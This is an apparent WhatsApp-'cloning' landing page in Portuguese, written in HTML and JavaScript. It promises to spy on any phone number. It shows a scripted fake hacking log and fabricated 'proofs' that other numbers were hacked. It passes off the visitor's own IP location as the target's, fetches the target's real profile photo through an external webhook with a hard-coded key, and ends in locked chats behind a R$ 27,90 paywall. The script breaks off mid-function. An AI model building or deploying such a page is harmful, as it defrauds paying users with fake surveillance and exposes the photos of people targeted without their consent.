<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Simulação WhatsApp — Coleta → Busca → Relatório</title>

<style>
  :root{
    --primary-green:#25D366; --light-green:#dcf8c6; --dark-green:#128C7E;
    --panel:#f0f2f5; --sidebar:#ffffff; --chatbg:#efeae2;
    --text:#1b1b1b; --muted:#667781; --white:#fff;
    --success:#34c759; --warning:#ffcc00; --danger:#ff3b30;
    --badge:#008069; --line:#e7ecef;
    --cta:#2aa57c; --cta-dark:#11845f; --bubble-in:#fff; --bubble-out:#d9fdd3;
  }
  *{box-sizing:border-box;margin:0;padding:0;font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif}
  body{background:var(--panel);color:var(--text);min-height:100vh;display:flex;flex-direction:column}

  /* ====== PÁGINA 1 ====== */
  .container{width:100%;max-width:980px;margin:20px auto;padding:0 16px;flex:1}
  .card{background:var(--white);border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,.07);padding:22px;margin-bottom:18px}
  h1{font-size:1.6rem;margin-bottom:8px}
  p.lead{color:var(--muted);margin-bottom:18px}
  .form-row{display:flex;gap:12px;align-items:center}
  .phone-input{flex:1;padding:12px 14px;border:1px solid #ddd;border-radius:10px;font-size:1rem;outline:none}
  .phone-input:focus{box-shadow:0 0 0 3px rgba(37,211,102,.12);border-color:var(--primary-green)}
  .btn{background:var(--primary-green);color:#fff;border:0;padding:12px 16px;border-radius:10px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:10px}
  .btn[disabled]{opacity:.6;cursor:not-allowed}
  .proofs{display:flex;flex-direction:column;gap:10px;margin-top:18px}
  .proof{background:var(--light-green);padding:10px;border-radius:10px;display:flex;gap:10px;align-items:center}
  .proof svg{width:18px;height:18px;fill:var(--primary-green)}
  .loading-wrap{display:none}
  .spinner{width:56px;height:56px;border-radius:50%;border:6px solid rgba(37,211,102,.2);border-top-color:var(--primary-green);animation:spin 1s linear infinite;margin:0 auto}
  @keyframes spin{to{transform:rotate(360deg)}}
  .progress{height:10px;background:#eee;border-radius:999px;overflow:hidden}
  .progress > i{display:block;height:100%;background:linear-gradient(90deg,var(--primary-green),#0a8b63);width:0%;transition:width .4s ease}
  .log{background:#f6f7f8;border-radius:8px;padding:12px;height:180px;overflow:auto;font-family:monospace;margin-top:12px;border:1px solid #eef2f5}
  .log-line{opacity:0;transform:translateY(8px);transition:opacity .25s,transform .25s;margin-bottom:8px}
  .log-line.visible{opacity:1;transform:none}
  .profile{display:none;margin-top:12px}
  .profile.visible{display:flex;flex-direction:column;gap:12px}
  .profile .head{display:flex;gap:12px;align-items:center}
  .profile img{width:84px;height:84px;border-radius:50%;object-fit:cover;border:3px solid var(--primary-green);background:#ddd}
  .detail{background:#fff;padding:12px;border-radius:10px;border:1px solid #eef2f5}
  .confirmbar{display:none;margin-top:12px;padding:10px;border:1px dashed #ddd;border-radius:8px;display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap}
  .btn.danger{background:var(--danger)}
  .btn.solid{background:var(--dark-green)}
  footer{padding:18px;text-align:center;color:var(--muted);font-size:.9rem}
  @media (max-width:720px){ .form-row{flex-direction:column;align-items:stretch} .btn{width:100%} }

  /* ====== PÁGINA 2 (RELATÓRIO/WA) ====== */
  #relatorioApp{display:none}
  .wa-wrap{display:grid;grid-template-columns:360px 1fr;min-height:100vh}
  .wa-sidebar{background:#fff;border-right:1px solid var(--line);display:flex;flex-direction:column}
  .wa-s-head{display:flex;align-items:center;gap:14px;padding:12px 14px;border-bottom:1px solid var(--line);background:#fff}
  .wa-avatar{width:38px;height:38px;border-radius:50%;object-fit:cover;background:#ddd;flex:0 0 auto}
  .wa-head-icons{display:flex;gap:18px;margin-left:8px}
  .ico-small{width:20px;height:20px;opacity:.75}
  .ico-btn{width:34px;height:34px;border-radius:50%;border:1px solid #e5eaee;background:#fff;display:grid;place-items:center;cursor:pointer}
  .ico-btn:hover{background:#f5f7f8}
  .promo{margin-left:auto}
  .promo .cta{background:#2dbd7f;color:#fff;border:none;border-radius:6px;padding:10px 18px;line-height:1.1;text-align:center;box-shadow:0 2px 0 rgba(0,0,0,.07)}
  .promo .cta b{display:block;font-size:15px}
  .promo .cta span{display:block;font-weight:800;font-size:14px;margin-top:4px}

  .wa-tabs{display:flex;gap:28px;padding:10px 14px;border-bottom:1px solid var(--line);background:#fff}
  .wa-tab{display:flex;gap:8px;align-items:center;color:#0a7c62;font-weight:800;cursor:pointer}
  .wa-tab:not(.active){color:#394046;opacity:.7}
  .wa-search{padding:10px 14px;border-bottom:1px solid var(--line);background:#fff}
  .wa-search input{width:100%;padding:12px 14px;border:1px solid #e1e5ea;border-radius:8px;outline:none;background:#fff}
  .wa-list{overflow:auto;background:#fff}
  .wa-item{display:grid;grid-template-columns:54px 1fr auto;gap:10px;align-items:center;padding:12px 14px;border-bottom:1px solid #f1f3f5;cursor:pointer;background:#fff}
  .wa-item:hover{background:#f8fbfc}
  .wa-avatar.sm{width:46px;height:46px;border:2px solid #e8eef1}
  .wa-meta{display:flex;flex-direction:column}
  .wa-name{font-weight:800}
  .wa-prev{color:var(--muted);font-size:13px;display:flex;align-items:center;gap:6px}
  .wa-badge{background:var(--badge);color:#fff;border-radius:12px;padding:2px 7px;font-size:12px;font-weight:800}
  .wa-dot{width:10px;height:10px;border-radius:50%;background:#25d366;display:inline-block}
  .wa-pin{font-size:14px;opacity:.65}
  .wa-mute{font-size:14px;opacity:.65}

  .wa-chat{background:var(--chatbg);display:flex;flex-direction:column}
  .wa-c-head{background:#fff;border-bottom:1px solid var(--line);padding:10px 14px;display:flex;align-items:center;gap:12px}
  .wa-title{display:flex;flex-direction:column}
  .wa-title .wa-name{font-weight:800}
  .wa-sub{color:var(--muted);font-size:12px}
  .wa-actions{margin-left:auto;display:flex;gap:12px}
  .ico{width:22px;height:22px;fill:#54656f}

  /* banner dentro do cabeçalho do chat, ao centro (como no print) */
  .header-promo{margin-left:auto;margin-right:auto}
  .header-promo .cta{background:#2dbd7f;color:#fff;border:none;border-radius:6px;padding:10px 18px;line-height:1.1;text-align:center;box-shadow:0 2px 0 rgba(0,0,0,.07)}
  .header-promo .cta b{display:block;font-size:15px}
  .header-promo .cta span{display:block;font-weight:800;font-size:14px;margin-top:4px}

  .wa-msgs{flex:1;overflow:auto;padding:14px 18% 20px 8%;display:flex;flex-direction:column;gap:16px}
  .wa-divider{display:flex;align-items:center;gap:12px;color:#7a8a92;font-size:12px;opacity:.9;margin:6px 8% 10px 6%}
  .wa-divider:before,.wa-divider:after{content:"";height:1px;background:#d9d9d9;flex:1}
  .wa-bubble{max-width:58%;padding:10px 12px;border-radius:8px;position:relative;box-shadow:0 1px 0 rgba(0,0,0,.06);color:#111}
  .wa-in .wa-bubble{background:#fff}
  .wa-out{display:flex;justify-content:flex-end}
  .wa-out .wa-bubble{background:#d9fdd3}
  .tick{font-size:12px;color:#6b7a85;margin-left:8px}
  .with-ava{display:flex;gap:10px;align-items:flex-end}
  .mini-ava{width:28px;height:28px;border-radius:50%;background:#e3e7ea}

  .wa-composer{background:#ffffff;border-top:1px solid var(--line);display:flex;align-items:center;gap:10px;padding:10px 14px}
  .chip{width:38px;height:38px;border-radius:50%;border:1px solid #e5eaee;display:grid;place-items:center;background:#fff;cursor:pointer}
  .wa-composer input{flex:1;border:1px solid #e1e6ea;border-radius:24px;padding:12px 15px;outline:none;background:#fff}
  .send{width:46px;height:46px;border-radius:50%;border:none;background:#19c37d;color:#fff;font-size:20px;cursor:pointer}

  .toast{position:fixed;right:18px;bottom:18px;background:#111b21;color:#fff;padding:10px 14px;border-radius:8px;opacity:0;transform:translateY(10px);transition:.25s;pointer-events:none;font-weight:600}
  .toast.show{opacity:1;transform:none}

  @media (max-width:1000px){ .wa-wrap{grid-template-columns:320px 1fr} .wa-msgs{padding-right:6%;padding-left:6%} }
  @media (max-width:820px){ .wa-wrap{grid-template-columns:1fr} .wa-sidebar{display:none} .header-promo{display:none} }
</style>
</head>
<body>

<!-- ========= PÁGINA 1 ========= -->
<div id="flowApp">
  <header style="display:flex;justify-content:space-between;align-items:center;padding:12px 18px;background:#fff;border-bottom:1px solid var(--line)">
    <div style="display:flex;align-items:center;gap:10px">
      <svg width="36" height="36" viewBox="0 0 24 24" fill="none"><path d="M21 7a2 2 0 0 0-2-2H5C3.9 5 3 5.9 3 7v10c0 1.1.9 2 2 2h9l4 3V7z" fill="#25D366"/></svg>
      <div><strong>SIM-DEMO</strong><div style="font-size:.8rem;color:var(--muted)">Fluxo: Coleta → Busca</div></div>
    </div>
    <button class="btn" onclick="location.reload()">Resetar</button>
  </header>

  <div class="container">
    <section id="step-collect" class="card">
      <h1>Parabéns — Acesso Gratuito</h1>
      <p class="lead">Insira o número abaixo (simulação). Em seguida iniciaremos a “busca” simulada e mostraremos o perfil.</p>
      <div class="form-row">
        <input id="phoneInput" class="phone-input" type="tel" placeholder="(99) 99999-9999" maxlength="15" />
        <button id="cloneButton" class="btn" disabled>
          <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor"><path d="M18 8h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-6 9a2 2 0 1 1 .001-3.999A2 2 0 0 1 12 17z"/></svg>
          Clonar WhatsApp Agora
        </button>
      </div>

      <div class="proofs">
        <div class="proof"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><div><strong id="proofText1"></strong></div></div>
        <div class="proof"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg><div><strong id="proofText2"></strong></div></div>
      </div>
    </section>

    <section id="step-loading" class="card loading-wrap" aria-hidden="true">
      <h1>Processando Acesso ao WhatsApp</h1>
      <p class="lead">Aguarde enquanto conectamos aos servidores e preparamos seu acesso.</p>

      <div style="display:flex;gap:18px;align-items:center;flex-wrap:wrap">
        <div style="flex:0 0 120px;text-align:center"><div class="spinner" id="spinner"></div></div>
        <div style="flex:1;min-width:220px">
          <div class="progress"><i id="progressFill"></i></div>
          <div style="margin-top:8px;color:var(--muted)" id="progressText">Conectando aos servidores... 0%</div>
          <div class="log" id="logContainer" aria-live="polite"></div>
        </div>
      </div>

      <div id="profileCard" class="profile" style="margin-top:18px">
        <div class="head">
          <img id="imgProfile" src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Foto de perfil">
          <div>
            <div style="font-weight:800" id="profileName">Perfil WhatsApp</div>
            <div style="color:var(--muted)" id="numeroPerfil">(XX) XXXXX-XXXX</div>
            <div style="color:var(--success);display:flex;align-items:center;gap:8px;margin-top:6px"><span style="width:9px;height:9px;background:var(--success);border-radius:50%;display:inline-block"></span> Online recentemente</div>
          </div>
        </div>

        <div class="detail">
          <div style="display:flex;gap:12px;align-items:center;margin-bottom:8px">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 1 1 16 0Z" fill="#eee"/></svg>
            <div><div style="font-size:.85rem;color:var(--muted)">Cidade de última conexão</div><div id="userCity" style="font-weight:700">Fortaleza</div></div>
          </div>
          <div style="display:flex;gap:12px;align-items:center">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect width="14" height="20" x="5" y="2" rx="2" ry="2" fill="#eee"/></svg>
            <div><div style="font-size:.85rem;color:var(--muted)">Status do dispositivo</div><div style="font-weight:700">Ativo</div></div>
          </div>
          <div style="margin-top:12px"><button class="btn solid" id="accessReportBtn">Acessar Relatório</button></div>

          <div id="confirmBar" class="confirmbar">
            <span id="confirmText" style="font-weight:700">É essa pessoa?</span>
            <div style="display:flex;gap:8px">
              <button class="btn" id="btnYes">Sim</button>
              <button class="btn danger" id="btnNo">Não, tentar sem 9</button>
            </div>
          </div>
        </div>
      </div>
    </section>
  </div>

  <footer>© 2025 — Simulação para testes. Não use para fins reais</footer>
</div>

<!-- ========= PÁGINA 2 (RELATÓRIO) ========= -->
<div id="relatorioApp">
  <div class="wa-wrap">
    <!-- COLUNA ESQUERDA -->
    <aside class="wa-sidebar">
      <div class="wa-s-head">
        <!-- FOTO DO NÚMERO CLONADO NO TOPO -->
        <img class="wa-avatar" id="sideMe" src="https://i.postimg.cc/0Qk0V7b7/user-ava.jpg" alt="">
        <div class="wa-head-icons">
          <svg class="ico-small" viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" stroke="#667781" stroke-width="2" fill="none"/><path d="m20 20-4-4" stroke="#667781" stroke-width="2"/></svg>
          <svg class="ico-small" viewBox="0 0 24 24"><path d="M12 22a2 2 0 0 0 2-2H10a2 2 0 0 0 2 2ZM18 16v-5a6 6 0 1 0-12 0v5l-2 2v1h16v-1Z" fill="#667781"/></svg>
          <div class="ico-btn" title="Menu">⋮</div>
        </div>
        <div class="promo">
          <button class="cta" id="ctaSide"><b>Liberar acesso completo</b><span>por R$ 27,90</span></button>
        </div>
      </div>

      <div class="wa-tabs">
        <div class="wa-tab active" id="tab-conv"><svg class="ico" viewBox="0 0 24 24"><path d="M21 15a4 4 0 0 1-4 4H7l-4 3V7a4 4 0 0 1 4-4h10a4 4 0 0 1 4 4v8Z" fill="#54656f"/></svg>CONVERSAS</div>
        <div class="wa-tab" id="tab-call"><svg class="ico" viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 11.2 19a19.5 19.5 0 0 1-6-6A19.79 19.79 0 0 1 2 4.18 2 2 0 0 1 4 2h3a2 2 0 0 1 2 1.72 12.8 12.8 0 0 0 .7 2.8 2 2 0 0 1-.45 2.1L8.1 9.9a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.1-.45 12.8 12.8 0 0 0 2.8.7A2 2 0 0 1 22 16.92Z" fill="#54656f"/></svg>LIGAÇÕES</div>
        <div class="wa-tab" id="tab-ctt"><svg class="ico" viewBox="0 0 24 24"><path d="M12 12a5 5 0 1 0-5-5 5 5 0 0 0 5 5Zm6 8H6a2 2 0 0 1-2-2v-1a6 6 0 0 1 6-6h4a6 6 0 0 1 6 6v1a2 2 0 0 1-2 2Z" fill="#54656f"/></svg>CONTATOS</div>
      </div>

      <div class="wa-search"><input id="waSearch" placeholder="Pesquisar ou começar nova conversa"></div>
      <div class="wa-list" id="waList"></div>
    </aside>

    <!-- ÁREA DO CHAT -->
    <main class="wa-chat">
      <div class="wa-c-head" id="chatHeader">
        <img class="wa-avatar" id="headAvatar" src="https://i.postimg.cc/59gN7m68/ava2.jpg" alt="">
        <div class="wa-title">
          <div class="wa-name" id="headName">Bloqueado ðŸ””</div>
          <div class="wa-sub" id="headSub">Horário Bloqueado ðŸ””</div>
        </div>

        <!-- banner ao centro do cabeçalho do chat -->
        <div class="header-promo">
          <button class="cta" id="ctaHead"><b>Liberar acesso completo</b><span>por R$ 27,90</span></button>
        </div>

        <div class="wa-actions">
          <div class="ico-btn" title="Chamada de voz"><svg class="ico" viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.79 19.79 0 0 1 11.2 19a19.5 19.5 0 0 1-6-6A19.79 19.79 0 0 1 2 4.18 2 2 0 0 1 4 2h3a2 2 0 0 1 2 1.72 12.8 12.8 0 0 0 .7 2.8 2 2 0 0 1-.45 2.1L8.1 9.9a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.1-.45 12.8 12.8 0 0 0 2.8.7A2 2 0 0 1 22 16.92Z"/></svg></div>
          <div class="ico-btn" title="Chamada de vídeo"><svg class="ico" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg></div>
          <div class="ico-btn" title="Menu"><svg class="ico" viewBox="0 0 24 24"><circle cx="12" cy="6" r="2"/><circle cx="12" cy="12" r="2"/><circle cx="12" cy="18" r="2"/></svg></div>
        </div>
      </div>

      <!-- divisor “Última atualização” -->
      <div class="wa-divider">Última atualização</div>

      <section class="wa-msgs" id="waMsgs">
        <div class="with-ava wa-in"><div class="mini-ava"></div><div class="wa-bubble">Conteúdo Bloqueado ðŸ””.<span class="tick"></span></div></div>
        <div class="wa-out"><div class="wa-bubble">Conteúdo Bloqueado ðŸ””.<span class="tick">✓✓</span></div></div>
        <div class="with-ava wa-in"><div class="mini-ava"></div><div class="wa-bubble">Conteúdo Bloqueado ðŸ””.<span class="tick"></span></div></div>
        <div class="wa-out"><div class="wa-bubble">Conteúdo Bloqueado ðŸ””.<span class="tick">✓✓</span></div></div>
      </section>

      <div class="wa-composer">
        <div class="chip" title="Emoji">😊</div>
        <div class="chip" title="Anexar">📎</div>
        <input id="composerInput" placeholder="Escreva sua mensagem">
        <div class="chip" title="Câmera">📷</div>
        <div class="chip" title="Microfone">🎤</div>
        <button class="send" id="sendBtn">➤</button>
      </div>
    </main>
  </div>

  <div class="toast" id="toast">Ação executada</div>
</div>

<script>
/* ===== Helpers / máscara ===== */
function maskBrPhone(v){
  let d = v.replace(/\D/g, '').slice(0, 11);
  if (d.length <= 2) return '(' + d;
  if (d.length <= 6) return `(${d.slice(0,2)}) ${d.slice(2)}`;
  if (d.length <= 10) return `(${d.slice(0,2)}) ${d.slice(2,6)}-${d.slice(6)}`;
  return `(${d.slice(0,2)}) ${d.slice(2,3)} ${d.slice(3,7)}-${d.slice(7,11)}`;
}
function formatarNumeroBrasil(numero){
  let num = (numero||'').replace(/\D/g,'');
  if(num.startsWith('55')) num = num.substr(2);
  if(num.length === 11) return num.replace(/^(\d{2})(\d{1})(\d{4})(\d{4})$/,'($1) $2 $3-$4');
  if(num.length === 10) return num.replace(/^(\d{2})(\d{4})(\d{4})$/,'($1) $2-$3');
  return numero;
}
function getNumeroApi(numero){
  let n = (numero||'').replace(/\D/g,'');
  if(!n.startsWith('55')) n = '55'+n;
  return n;
}
function resolveCandidatesForInteractive(raw){
  let num = (raw||'').replace(/\D/g,'');
  if(!num.startsWith('55')) num = '55' + num;
  const local = num.slice(2), ddd = local.slice(0,2), rest = local.slice(2);
  let preferred = num, alt = null;
  if(rest.length === 8){ preferred = '55'+ddd+'9'+rest; alt = num; }
  else if(rest.length === 9){ const restSem9 = rest.startsWith('9')? rest.slice(1): rest.slice(1); alt = '55'+ddd+restSem9; }
  return { preferred, alt, hasAlt: !!alt };
}
async function fetchWithTimeout(url, options = {}, timeoutMs = 10000){
  const controller = new AbortController(); const id = setTimeout(() => controller.abort(), timeoutMs);
  try{ const resp = await fetch(url, { ...options, signal: controller.signal }); return resp; } finally{ clearTimeout(id); }
}

/* ===== Elements (página 1) ===== */
const phoneInput = document.getElementById('phoneInput');
const cloneButton = document.getElementById('cloneButton');
const stepCollect = document.getElementById('step-collect');
const stepLoading = document.getElementById('step-loading');
const progressFill = document.getElementById('progressFill');
const progressText = document.getElementById('progressText');
const logContainer = document.getElementById('logContainer');
const profileCard = document.getElementById('profileCard');
const imgProfile = document.getElementById('imgProfile');
const numeroPerfil = document.getElementById('numeroPerfil');
const userCityElement = document.getElementById('userCity');
const accessReportBtn = document.getElementById('accessReportBtn');
const confirmBar = document.getElementById('confirmBar');
const confirmText = document.getElementById('confirmText');
const btnYes = document.getElementById('btnYes');
const btnNo  = document.getElementById('btnNo');

/* ===== Simulação/rotativos ===== */
const actions = ['está sendo clonado agora...','está sendo monitorado silenciosamente...','teve as mensagens interceptadas!','está sob vigilância agora...','foi rastreado com sucesso!','teve o WhatsApp clonado com sucesso!','está sendo espionado neste momento...','teve as conversas expostas!','está sendo rastreado em tempo real...','teve o acesso liberado para monitoramento!','teve o histórico de chamadas acessado!','está com todas as mensagens sendo monitoradas!','teve o WhatsApp hackeado com sucesso!','está com localização sendo rastreada!','teve as fotos e vídeos acessados!'];
const dddToState = { '11':'São Paulo','12':'São Paulo','13':'São Paulo','14':'São Paulo','15':'São Paulo','16':'São Paulo','17':'São Paulo','18':'São Paulo','19':'São Paulo','21':'Rio de Janeiro','22':'Rio de Janeiro','24':'Rio de Janeiro','27':'Espírito Santo','28':'Espírito Santo','31':'Minas Gerais','32':'Minas Gerais','33':'Minas Gerais','34':'Minas Gerais','35':'Minas Gerais','37':'Minas Gerais','38':'Minas Gerais','41':'Paraná','42':'Paraná','43':'Paraná','44':'Paraná','45':'Paraná','46':'Paraná','47':'Santa Catarina','48':'Santa Catarina','49':'Santa Catarina','51':'Rio Grande do Sul','53':'Rio Grande do Sul','54':'Rio Grande do Sul','55':'Rio Grande do Sul','61':'Distrito Federal','62':'Goiás','63':'Tocantins','64':'Goiás','65':'Mato Grosso','66':'Mato Grosso','67':'Mato Grosso do Sul','68':'Acre','69':'Rondônia','71':'Bahia','73':'Bahia','74':'Bahia','75':'Bahia','77':'Bahia','79':'Sergipe','81':'Pernambuco','82':'Alagoas','83':'Paraíba','84':'Rio Grande do Norte','85':'Ceará','86':'Piauí','87':'Pernambuco','88':'Ceará','89':'Piauí','91':'Pará','92':'Amazonas','93':'Pará','94':'Pará','95':'Roraima','96':'Amapá','97':'Amazonas','98':'Maranhão','99':'Maranhão' };
const allDDDs = Object.keys(dddToState);

function genRandomProof(){
  const ddd = allDDDs[Math.floor(Math.random()*allDDDs.length)];
  const first = Math.floor(Math.random()*10000).toString().padStart(4,'0');
  const last = 'XX'+Math.floor(Math.random()*100).toString().padStart(2,'0');
  const formatted = `(${ddd}) 9${first}-${last}`;
  const state = dddToState[ddd];
  return `${formatted} de ${state} ${actions[Math.floor(Math.random()*actions.length)]}`;
}
document.getElementById('proofText1').textContent = genRandomProof();
document.getElementById('proofText2').textContent = genRandomProof();
setInterval(()=>{ document.getElementById('proofText1').textContent = genRandomProof(); }, 4000);
setInterval(()=>{ document.getElementById('proofText2').textContent = genRandomProof(); }, 6000);

/* ===== Flow ===== */
phoneInput.addEventListener('input', (e)=>{
  const v = maskBrPhone(e.target.value); e.target.value = v;
  v.replace(/\D/g,'').length >= 10 ? cloneButton.removeAttribute('disabled') : cloneButton.setAttribute('disabled','');
});
cloneButton.addEventListener('click', ()=>{
  if(cloneButton.hasAttribute('disabled')) return;
  const phone = phoneInput.value.trim(); if(!phone) return;
  localStorage.setItem('numeroClonado', phone);
  stepCollect.style.display='none'; stepLoading.style.display='block'; stepLoading.setAttribute('aria-hidden','false');
  startLoadingFlow();
});

const logMessages = [
  { text: 'Iniciando conexão com servidores WhatsApp...', delay: 800, icon: '🔗' },
  { text: 'Localizando servidor mais próximo...', delay: 1800, icon: '📡' },
  { text: 'Servidor localizado! Estabelecendo conexão segura...', delay: 3200, icon: '✅', cls:'success' },
  { text: 'Verificando número de telefone...', delay: 4800, icon: '📞' },
  { text: 'Número de telefone válido!', delay: 6400, icon: '✅', cls:'success' },
  { text: 'Analisando base de dados...', delay: 8200, icon: '🗄️' },
  { text: 'Buscando informações de perfil...', delay: 10000, icon: '🔎' },
  { text: 'Detectando localização do dispositivo...', delay: 11800, icon: '📍' },
  { text: '', delay: 14000, isLocation:true },
  { text: 'Preparando canal privado de leitura...', delay: 16000, icon: '🔧' },
  { text: 'Canal privado estabelecido!', delay: 17800, icon: '✅', cls:'success' },
  { text: 'Sincronizando mensagens...', delay: 19800, icon: '🔁' },
  { text: 'Sincronização completa!', delay: 21800, icon: '✅', cls:'success' },
  { text: 'Acesso concedido com sucesso!', delay: 23800, icon: '🔓', cls:'success' }
];
function addLogLine(text, cls='', icon=''){
  const node = document.createElement('div');
  node.className = 'log-line '+(cls||'');
  node.innerHTML = (icon?('<strong>'+icon+'</strong> '):'') + (text||'');
  logContainer.appendChild(node); logContainer.scrollTop = logContainer.scrollHeight;
  setTimeout(()=>node.classList.add('visible'),50);
}
function setProgress(p){ progressFill.style.width = p+'%'; progressText.textContent = `Conectando aos servidores... ${p}%`; }

function startLoadingFlow(){
  logContainer.innerHTML=''; profileCard.classList.remove('visible');
  imgProfile.src = 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
  numeroPerfil.textContent = localStorage.getItem('numeroClonado') || '(XX) XXXXX-XXXX';
  userCityElement.textContent = 'Carregando...'; confirmBar.style.display='none'; setProgress(2);

  logMessages.forEach(msg=>{
    setTimeout(async ()=>{
      if(msg.isLocation){
        try{
          const res = await fetch('https://wtfismyip.com/json'); const data = await res.json();
          const userCity = data.YourFuckingCity || data.city || 'Fortaleza';
          const userCountry = data.YourFuckingCountry || data.country || 'Brasil';
          addLogLine(`Localização suspeita encontrada em ${userCity}, ${userCountry}`, 'warning','📍');
          userCityElement.textContent = userCity;
        }catch(e){
          addLogLine('Não foi possível detectar localização precisa', 'warning','⚠️'); userCityElement.textContent = 'Fortaleza';
        }
      }else addLogLine(msg.text, msg.cls||'', msg.icon||'');
    }, msg.delay);
  });

  let progress = 2;
  const interval = setInterval(()=>{
    progress = Math.min(100, progress + Math.ceil(Math.random()*3));
    setProgress(progress);
    if(progress>=100){ clearInterval(interval);
      setTimeout(()=>{ profileCard.classList.add('visible');
        const numeroApi = getNumeroApi(localStorage.getItem('numeroClonado')||'');
        iniciarBuscaComConfirmacao(numeroApi);
      },900);
    }
  },250);
}

async function fetchProfileOnce(candidate){
  const url = "https://w.imagens.pics/webhook/182dd";
  const key = "wuAsuKHImXennBSFjt895tu984ut5";
  let foto = null, statusTxt = '', errorDetail=null, ok=false;

  try{
    addLogLine(`Consultando perfil (${candidate}) via POST...`, '', '📤');
    const resp = await fetchWithTimeout(url, { method:"POST", headers:{"Content-Type":"application/json","key":key}, body:JSON.stringify({ number:candidate })}, 12000);
    if(resp.ok){ const data = await resp.json(); foto=data.foto||data.photo||null; statusTxt=data.Status||data.status||''; ok=!!foto; if(ok) return {ok:true,foto,statusTxt}; errorDetail='POST ok, mas sem foto'; }
    else errorDetail=`POST ${resp.status} ${resp.statusText}`;
  }catch(e){ errorDetail=`POST falhou (${e && e.name==='AbortError'?'timeout':'CORS/fetch'})`; }

  try{
    addLogLine(`Tentando via GET (fallback) para ${candidate}...`, '', '🔁');
    const u = `${url}?number=${encodeURIComponent(candidate)}&key=${encodeURIComponent(key)}`;
    const resp2 = await fetchWithTimeout(u, { method:"GET" }, 12000);
    if(resp2.ok){ const data2 = await resp2.json(); foto=data2.foto||data2.photo||null; statusTxt=data2.Status||data2.status||''; ok=!!foto; if(ok) return {ok:true,foto,statusTxt}; errorDetail='GET ok, mas sem foto'; }
    else errorDetail=`GET ${resp2.status} ${resp2.statusText}`;
  }catch(e2){ errorDetail=`GET falhou (${e2 && e2.name==='AbortError'?'timeout':'CORS/fetch'})`; }

  return { ok:false, foto:null, statusTxt:'', errorDetail };
}

async function diagnosticarWebhook(numero){
  const url = "https://w.imagens.pics/webhook/182dd"; const key = "wuAsuKHImXennBSFjt895tu984ut5";
  async function tryOnce(n,mode){
    if(mode==='POST') return await fetchWithTimeout(url,{method:"POST",headers:{"Content-Type":"application/json","key":key},body:JSON.stringify({number:n})},8000);
    const u = `${url}?number=${encodeURIComponent(n)}&key=${encodeURIComponent(key)}`; return await fetchWithTimeout(u,{method:"GET"},8000);
  }
  let result={reached:false,connected:false,code:null,detail:null,sample:null};
  for(const mode of ['POST','GET']){
    try{
      const resp=await tryOnce(numero,mode); result.code=resp.status;
      if(resp.ok){ result.reached=true; const data=await resp.json().catch(()=>null); result.sample=data;
        const statusStr=(data&&(data.status||data.Status))?String(data.status||data.Status).toLowerCase():''; const hasFoto=!!(data&&(data.foto||data.photo));
        result.connected = hasFoto || /connect|online|session|ok|success/.test(statusStr); return result;
      }else result.detail=`${mode} ${resp.status} ${resp.statusText}`;
    }catch(e){ result.detail=`${mode} falhou (${e && e.name==='AbortError'?'timeout':'fetch/CORS'})`; }
  }
  return result;
}

async function iniciarBuscaComConfirmacao(numeroApi){
  const { preferred, alt, hasAlt } = resolveCandidatesForInteractive(numeroApi);
  const res1 = await fetchProfileOnce(preferred);

  numeroPerfil.textContent = formatarNumeroBrasil(localStorage.getItem('numeroClonado')||'');
  if(res1.ok){
    imgProfile.src = res1.foto;
    localStorage.setItem('fotoperfil', res1.foto);
    localStorage.setItem('Status', res1.statusTxt || '');
    addLogLine('Perfil carregado com sucesso!', 'success','✅');
  }else{
    imgProfile.src = 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
    addLogLine('Não foi possível obter a foto do perfil (possível CORS/timeout/sem foto).', 'warning','⚠️');
    if(res1.errorDetail) addLogLine(`Detalhe: ${res1.errorDetail}`, 'warning','🪵');
  }

  try{
    const diag = await diagnosticarWebhook(numeroApi);
    if (!diag.reached) addLogLine('Diagnóstico: webhook não respondeu (CORS/timeout).', 'warning','🛑');
    else if (diag.connected) addLogLine('Diagnóstico: webhook ativo e há sinais de sessão WhatsApp conectada.', 'success','🟢');
    else addLogLine(`Diagnóstico: webhook respondeu${diag.code ? ' '+diag.code : ''}, mas sem sinais claros de sessão ativa.`, 'warning','🟡');
  }catch(e){ addLogLine('Diagnóstico: falhou ao inspecionar o webhook.', 'warning','🛑'); }

  if(hasAlt){
    const altLocalLen = alt.replace(/^55/,'').length;
    btnNo.textContent = (altLocalLen===10) ? 'Não, tentar sem 9' : 'Não, tentar com 9';
    confirmText.textContent = res1.ok ? 'É essa pessoa?' : 'Não encontramos foto com este formato. Tentar outra variação?';
    confirmBar.style.display='flex';
    btnYes.onclick = ()=>{ confirmBar.style.display='none'; btnYes.onclick=null; btnNo.onclick=null; };
    btnNo.onclick = async ()=>{
